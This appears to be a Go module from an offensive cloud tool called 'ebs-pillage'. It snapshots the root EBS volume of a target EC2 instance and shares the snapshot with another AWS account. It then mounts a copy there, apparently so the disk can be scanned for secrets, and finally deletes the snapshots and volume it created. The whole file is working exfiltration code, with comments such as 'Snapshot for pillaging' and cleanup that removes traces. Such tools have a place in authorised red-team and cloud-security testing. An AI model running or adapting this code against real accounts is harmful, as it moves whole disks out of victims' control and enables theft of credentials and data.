package aws

import (
	"context"
	"fmt"
	"log"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2/types"
	"ebs-pillage/internal/config"
)

// EBSOperations handles EBS volume operations
type EBSOperations struct {
	srcClient *Client
	dstClient *Client
	cfg       *config.Config
}

// NewEBSOperations creates a new EBS operations handler
func NewEBSOperations(srcClient, dstClient *Client, cfg *config.Config) *EBSOperations {
	return &EBSOperations{
		srcClient: srcClient,
		dstClient: dstClient,
		cfg:       cfg,
	}
}

// ListVolumes lists all available EBS volumes
func (e *EBSOperations) ListVolumes(ctx context.Context) error {
	volumesResp, err := e.dstClient.EC2.DescribeVolumes(ctx, &ec2.DescribeVolumesInput{})
	if err != nil {
		return fmt.Errorf("failed to describe volumes: %w", err)
	}

	for _, volume := range volumesResp.Volumes {
		if volume.State == types.VolumeStateAvailable {
			log.Printf("EBS Volume ID: %s, State: %s, Size: %d GiB, Snapshot ID: %s\n",
				*volume.VolumeId,
				volume.State,
				volume.Size,
				aws.ToString(volume.SnapshotId))
		}
	}

	return nil
}

// ListSnapshots lists all available snapshots
func (e *EBSOperations) ListSnapshots(ctx context.Context) error {
	snapshotsResp, err := e.dstClient.EC2.DescribeSnapshots(ctx, &ec2.DescribeSnapshotsInput{
		OwnerIds: []string{"self"},
	})
	if err != nil {
		return fmt.Errorf("failed to describe snapshots: %w", err)
	}

	for _, snapshot := range snapshotsResp.Snapshots {
		log.Printf("Snapshot ID: %s, Volume ID: %s, State: %s, Start Time: %s\n",
			*snapshot.SnapshotId,
			*snapshot.VolumeId,
			snapshot.State,
			snapshot.StartTime.String())
	}

	return nil
}

// CreateSnapshot creates a snapshot of the root volume of the specified instance
func (e *EBSOperations) CreateSnapshot(ctx context.Context, instanceID string) (string, string, error) {
	// First, get the instance details to find the root volume
	instanceResp, err := e.srcClient.EC2.DescribeInstances(ctx, &ec2.DescribeInstancesInput{
		InstanceIds: []string{instanceID},
	})
	if err != nil {
		return "", "", fmt.Errorf("failed to describe instance: %w", err)
	}

	if len(instanceResp.Reservations) == 0 || len(instanceResp.Reservations[0].Instances) == 0 {
		return "", "", fmt.Errorf("instance %s not found", instanceID)
	}

	instance := instanceResp.Reservations[0].Instances[0]
	rootDevice := instance.RootDeviceName

	// Find root volume ID
	var rootVolumeID string
	for _, mapping := range instance.BlockDeviceMappings {
		if *mapping.DeviceName == *rootDevice {
			rootVolumeID = *mapping.Ebs.VolumeId
			break
		}
	}

	if rootVolumeID == "" {
		return "", "", fmt.Errorf("root volume not found for instance %s", instanceID)
	}

	// Get KMS key ID if volume is encrypted
	volumeResp, err := e.srcClient.EC2.DescribeVolumes(ctx, &ec2.DescribeVolumesInput{
		VolumeIds: []string{rootVolumeID},
	})
	if err != nil {
		return "", "", fmt.Errorf("failed to describe volume: %w", err)
	}

	var kmsKeyID string
	if len(volumeResp.Volumes) > 0 && volumeResp.Volumes[0].KmsKeyId != nil {
		kmsKeyID = *volumeResp.Volumes[0].KmsKeyId
	}

	// Create snapshot
	createSnapshotInput := &ec2.CreateSnapshotInput{
		VolumeId:    aws.String(rootVolumeID),
		Description: aws.String("Snapshot for pillaging"),
		TagSpecifications: []types.TagSpecification{
			{
				ResourceType: types.ResourceTypeSnapshot,
				Tags: []types.Tag{
					{
						Key:   aws.String("Name"),
						Value: aws.String("TrufflehogTesting"),
					},
				},
			},
		},
	}

	snapshotResp, err := e.srcClient.EC2.CreateSnapshot(ctx, createSnapshotInput)
	if err != nil {
		return "", "", fmt.Errorf("failed to create snapshot: %w", err)
	}

	// Wait for snapshot to complete
	waiter := ec2.NewSnapshotCompletedWaiter(e.srcClient.EC2)
	err = waiter.Wait(ctx, &ec2.DescribeSnapshotsInput{
		SnapshotIds: []string{*snapshotResp.SnapshotId},
	}, 30*time.Minute)

	if err != nil {
		return "", "", fmt.Errorf("failed waiting for snapshot completion: %w", err)
	}

	return *snapshotResp.SnapshotId, kmsKeyID, nil
}

// ShareSnapshot shares a snapshot with another account
func (e *EBSOperations) ShareSnapshot(ctx context.Context, snapshotID, accountID string) error {
	input := &ec2.ModifySnapshotAttributeInput{
		SnapshotId: aws.String(snapshotID),
		Attribute:  types.SnapshotAttributeNameCreateVolumePermission,
		CreateVolumePermission: &types.CreateVolumePermissionModifications{
			Add: []types.CreateVolumePermission{
				{
					UserId: aws.String(accountID),
				},
			},
		},
	}

	_, err := e.srcClient.EC2.ModifySnapshotAttribute(ctx, input)
	if err != nil {
		return fmt.Errorf("failed to share snapshot: %w", err)
	}

	return nil
}

// CreateVolumeFromSnapshot creates a new volume from a snapshot
func (e *EBSOperations) CreateVolumeFromSnapshot(ctx context.Context, snapshotID, availabilityZone string) (string, error) {
	input := &ec2.CreateVolumeInput{
		SnapshotId:       aws.String(snapshotID),
		AvailabilityZone: aws.String(availabilityZone),
	}

	result, err := e.dstClient.EC2.CreateVolume(ctx, input)
	if err != nil {
		return "", fmt.Errorf("failed to create volume: %w", err)
	}

	// Wait for the volume to become available
	waiter := ec2.NewVolumeAvailableWaiter(e.dstClient.EC2)
	err = waiter.Wait(ctx, &ec2.DescribeVolumesInput{
		VolumeIds: []string{*result.VolumeId},
	}, 5*time.Minute)

	if err != nil {
		return "", fmt.Errorf("failed waiting for volume to become available: %w", err)
	}

	return *result.VolumeId, nil
}

// DeleteSnapshotAndVolume deletes the specified snapshot and volume
func (e *EBSOperations) DeleteSnapshotAndVolume(ctx context.Context, srcSnapshotID, dstSnapshotID, volumeID string) error {
	if volumeID != "" {
		_, err := e.dstClient.EC2.DeleteVolume(ctx, &ec2.DeleteVolumeInput{
			VolumeId: aws.String(volumeID),
		})
		if err != nil {
			log.Printf("Warning: failed to delete volume %s: %v", volumeID, err)
		}
	}

	if srcSnapshotID != "" {
		_, err := e.srcClient.EC2.DeleteSnapshot(ctx, &ec2.DeleteSnapshotInput{
			SnapshotId: aws.String(srcSnapshotID),
		})
		if err != nil {
			log.Printf("Warning: failed to delete source snapshot %s: %v", srcSnapshotID, err)
		}
	}

	if dstSnapshotID != "" && dstSnapshotID != srcSnapshotID {
		_, err := e.dstClient.EC2.DeleteSnapshot(ctx, &ec2.DeleteSnapshotInput{
			SnapshotId: aws.String(dstSnapshotID),
		})
		if err != nil {
			log.Printf("Warning: failed to delete destination snapshot %s: %v", dstSnapshotID, err)
		}
	}

	return nil
}

// getNextAvailableDevice finds the next available device name for volume attachment
func (e *EBSOperations) getNextAvailableDevice(ctx context.Context, instanceID string) (string, error) {
	// Get current instance block device mappings
	instanceResp, err := e.dstClient.EC2.DescribeInstances(ctx, &ec2.DescribeInstancesInput{
		InstanceIds: []string{instanceID},
	})
	if err != nil {
		return "", fmt.Errorf("failed to describe instance: %w", err)
	}

	if len(instanceResp.Reservations) == 0 || len(instanceResp.Reservations[0].Instances) == 0 {
		return "", fmt.Errorf("instance %s not found", instanceID)
	}

	// Get list of used device names
	usedDevices := make(map[string]bool)
	for _, mapping := range instanceResp.Reservations[0].Instances[0].BlockDeviceMappings {
		usedDevices[*mapping.DeviceName] = true
	}

	// Try device names from xvdf to xvdz, then xvdba to xvdbz, then xvdca to xvdcz
	devicePrefixes := []string{"xvd", "xvdb", "xvdc"}
	for _, prefix := range devicePrefixes {
		for c := 'a'; c <= 'z'; c++ {
			// Skip 'a' to 'e' for the first prefix as they're typically reserved
			if prefix == "xvd" && c <= 'e' {
				continue
			}
			deviceName := fmt.Sprintf("/dev/%s%c", prefix, c)
			if !usedDevices[deviceName] {
				return deviceName, nil
			}
		}
	}

	return "", fmt.Errorf("no available device names found")
}

// VerifyVolumeAttachment verifies that a volume is attached and returns its actual device name
func (e *EBSOperations) VerifyVolumeAttachment(ctx context.Context, volumeID, instanceID string) (string, error) {
	input := &ec2.DescribeVolumesInput{
		VolumeIds: []string{volumeID},
	}

	result, err := e.dstClient.EC2.DescribeVolumes(ctx, input)
	if err != nil {
		return "", fmt.Errorf("failed to describe volume: %w", err)
	}

	if len(result.Volumes) == 0 {
		return "", fmt.Errorf("volume %s not found", volumeID)
	}

	volume := result.Volumes[0]
	if len(volume.Attachments) == 0 {
		return "", fmt.Errorf("volume %s is not attached", volumeID)
	}

	for _, attachment := range volume.Attachments {
		if *attachment.InstanceId == instanceID {
			return *attachment.Device, nil
		}
	}

	return "", fmt.Errorf("volume %s is not attached to instance %s", volumeID, instanceID)
}

// AttachVolume attaches a volume to an instance
func (e *EBSOperations) AttachVolume(ctx context.Context, volumeID, instanceID, device string) (string, error) {
	// Find next available device name
	deviceName, err := e.getNextAvailableDevice(ctx, instanceID)
	if err != nil {
		return "", fmt.Errorf("failed to find available device name: %w", err)
	}

	input := &ec2.AttachVolumeInput{
		VolumeId:   aws.String(volumeID),
		InstanceId: aws.String(instanceID),
		Device:     aws.String(deviceName),
	}

	_, err = e.dstClient.EC2.AttachVolume(ctx, input)
	if err != nil {
		return "", fmt.Errorf("failed to attach volume: %w", err)
	}

	// Wait for volume to be attached
	waiter := ec2.NewVolumeInUseWaiter(e.dstClient.EC2)
	err = waiter.Wait(ctx, &ec2.DescribeVolumesInput{
		VolumeIds: []string{volumeID},
	}, 5*time.Minute)

	if err != nil {
		return "", fmt.Errorf("failed waiting for volume to be attached: %w", err)
	}

	// Verify attachment and get actual device name
	actualDevice, err := e.VerifyVolumeAttachment(ctx, volumeID, instanceID)
	if err != nil {
		return "", fmt.Errorf("failed to verify volume attachment: %w", err)
	}

	return actualDevice, nil
}

// DetachVolume detaches a volume from an instance
func (e *EBSOperations) DetachVolume(ctx context.Context, volumeID string) error {
	input := &ec2.DetachVolumeInput{
		VolumeId: aws.String(volumeID),
	}

	_, err := e.dstClient.EC2.DetachVolume(ctx, input)
	if err != nil {
		return fmt.Errorf("failed to detach volume: %w", err)
	}

	// Wait for volume to be detached
	waiter := ec2.NewVolumeAvailableWaiter(e.dstClient.EC2)
	err = waiter.Wait(ctx, &ec2.DescribeVolumesInput{
		VolumeIds: []string{volumeID},
	}, 5*time.Minute)

	if err != nil {
		return fmt.Errorf("failed waiting for volume to be detached: %w", err)
	}

	return nil
} 